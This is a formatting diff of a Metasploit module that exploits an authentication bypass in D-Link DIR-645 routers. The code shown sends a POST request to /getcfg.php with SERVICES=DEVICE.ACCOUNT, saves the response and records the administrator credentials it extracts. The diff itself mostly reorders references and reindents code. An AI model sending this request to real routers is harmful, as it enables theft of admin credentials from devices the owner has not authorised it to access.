@@ -16,19 +16,21 @@ class Metasploit3 < Msf::Auxiliary
 		super(
 			'Name'        => 'DLink DIR 645 Password Extractor',
 			'Description' => %q{
-				This module exploits an authentication bypass vulnerability in DIR 645 < v1.03.
-				With this vulnerability you are able to extract the password for the remote management.
-				},
+					This module exploits an authentication bypass vulnerability in DIR 645 < v1.03.
+				With this vulnerability you are able to extract the password for the remote
+				management.
+			},
 			'References'  =>
 				[
-					[ 'URL', 'http://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt' ],
+					[ 'OSVDB', '90733' ],
 					[ 'BID', '58231' ],
-					[ 'OSVDB', '90733' ]
+					[ 'URL', 'http://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt' ]
 				],
-			'Author'      => [
-				'Michael Messner <devnull@s3cur1ty.de>',	#metasploit module
-				'Roberto Paleari <roberto@greyhats.it>'		#vulnerability discovery
-			],
+			'Author'      =>
+				[
+					'Roberto Paleari <roberto@greyhats.it>', # Vulnerability discovery
+					'Michael Messner <devnull@s3cur1ty.de>'	 # Metasploit module
+				],
 			'License'     => MSF_LICENSE
 		)
 	end
@@ -45,8 +47,9 @@ class Metasploit3 < Msf::Auxiliary
 			res = send_request_cgi({
 				'uri' => '/getcfg.php',
 				'method' => 'POST',
-				'vars_post' => {
-					'SERVICES' => 'DEVICE.ACCOUNT'
+				'vars_post' =>
+					{
+						'SERVICES' => 'DEVICE.ACCOUNT'
 					}
 				})
 
@@ -58,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
 				print_good("#{rhost}:#{rport} - credentials successfully extracted")
 
 				#store all details as loot -> there is some usefull stuff in the response
-				loot = store_loot("account_details.txt","text/plain",rhost, res.body)
+				loot = store_loot("dlink.dir645.config","text/plain",rhost, res.body)
 				print_good("#{rhost}:#{rport} - Account details downloaded to: #{loot}")
 
 				res.body.each_line do |line|
@@ -78,7 +81,7 @@ class Metasploit3 < Msf::Auxiliary
 						:user => @user,
 						:pass => pass,
 						:active => true
-						)
+					)
 					end
 				end
 			end
